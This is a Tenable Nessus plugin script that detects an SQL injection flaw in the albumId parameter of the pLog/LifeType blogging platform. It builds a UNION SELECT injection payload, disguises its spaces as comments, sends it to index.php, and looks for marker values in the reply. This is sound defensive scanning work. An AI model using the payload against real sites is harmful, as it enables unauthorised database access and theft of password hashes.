#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(33103);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-2629");
  script_xref(name:"milw0rm", value:"5724");
  script_xref(name:"OSVDB", value:"46113");

  script_name(english:"LifeType for Drupal (pLog) index.php albumId Parameter SQL Injection");
  script_summary(english:"Tries to exploit SQL injection issue in pLog");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running pLog or Lifetype, open-source blogging
platforms written in PHP. 

The remote version of this software fails to sanitize user-supplied
input to the 'albumId' parameter of the 'index.php' script before
using it in a database query in the 'getAlbum()' method in
'class/gallery/dao/galleryalbums.class.php'.  An unauthenticated
attacker can exploit this issue to manipulate database queries
resulting in disclosure of sensitive information (such as password
hashes) or to launch attacks against the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


magic1 = rand();
magic2 = rand();

exploit = string("-1 UNION SELECT 0,1,",magic1,",",magic2,",1,1,1,1,1--");


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/plog", "/blog" , "/lifetype", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to manipulate a category listing.
  r = http_send_recv3(method:"GET", port: port, 
    item:string(
      dir, "/index.php?",
      "op=ViewAlbum&",
      "albumId=", str_replace(find:" ", replace:"/**/", string:exploit), "&",
      "blogId=1") );
  if (isnull(r)) exit(0);
  res = r[2];
	
  # If we see evidence of pLog / Lifetype and our magic numbers.
  if (
    (
      egrep(pattern:"Powered by.+>pLog</a>", string:res) ||
      '<meta name="generator" content="lifetype' >< res
    ) && 
    magic1 >< res  &&
    magic2 >< res 
  ) 
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  } 
}  

